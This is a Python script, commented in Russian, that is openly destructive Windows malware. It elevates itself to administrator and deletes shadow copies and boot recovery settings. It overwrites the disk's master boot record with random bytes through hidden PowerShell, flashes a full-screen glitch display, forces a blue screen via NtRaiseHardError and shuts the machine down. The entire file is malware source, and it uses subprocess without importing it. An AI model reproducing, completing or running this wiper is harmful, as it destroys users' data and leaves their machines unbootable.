import os
import sys
import time
import ctypes
import random
import threading
import tkinter as tk

# ==========================================
# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И СНОС MBR
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def destroy_mbr():
    # Отключаем восстановление
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Сносим MBR через PowerShell (C#)
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ЧАСТЬ 2: КИСЛОТНЫЙ ГЛИТЧ (НОВЫЙ ЭФФЕКТ)
# ==========================================

def visual_glitch():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)

    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
    canvas.pack()

    colors = ["#00FF00", "#FF00FF", "#00FFFF", "#FFFF00", "#FF0000", "#0000FF", "#FFFFFF"]

    def draw_glitch():
        while True:
            try:
                w = root.winfo_screenwidth()
                h = root.winfo_screenheight()
                
                # Рисуем случайные горизонтальные полосы (как при сбое видеокарты)
                for _ in range(30):
                    x1 = random.randint(0, w)
                    y1 = random.randint(0, h)
                    x2 = x1 + random.randint(50, 300)
                    y2 = y1 + random.randint(1, 10)
                    color = random.choice(colors)
                    canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
                
                # Рисуем случайные пиксели (шум)
                for _ in range(100):
                    x = random.randint(0, w)
                    y = random.randint(0, h)
                    color = random.choice(colors)
                    canvas.create_rectangle(x, y, x+5, y+5, fill=color, outline="")
                
                root.update()
                time.sleep(0.05) # Задержка для эффекта мерцания
            except:
                break

    # Запускаем рисование в отдельном потоке
    threading.Thread(target=draw_glitch, daemon=True).start()
    
    root.after(15000, root.destroy) # Через 15 секунд закроется
    root.mainloop()

# ==========================================
# ЧАСТЬ 3: BSOD И ВЫКЛЮЧЕНИЕ
# ==========================================

def trigger_bsod():
    bsod_cmd = 'powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class BSOD { [DllImport(\\"ntdll.dll\\")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue); [DllImport(\\"ntdll.dll\\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); }\'; $pv = $false; [BSOD]::RtlAdjustPrivilege(19, $true, $false, [ref]$pv); $resp = 0; [BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$resp)"'
    subprocess.run(bsod_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # Запускаем снос MBR в фоне
    threading.Thread(target=destroy_mbr, daemon=True).start()

    # Запускаем визуальный глитч на 15 секунд
    visual_glitch()

    # Вызываем BSOD и выключаем
    trigger_bsod()
    time.sleep(2)
    os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    main()
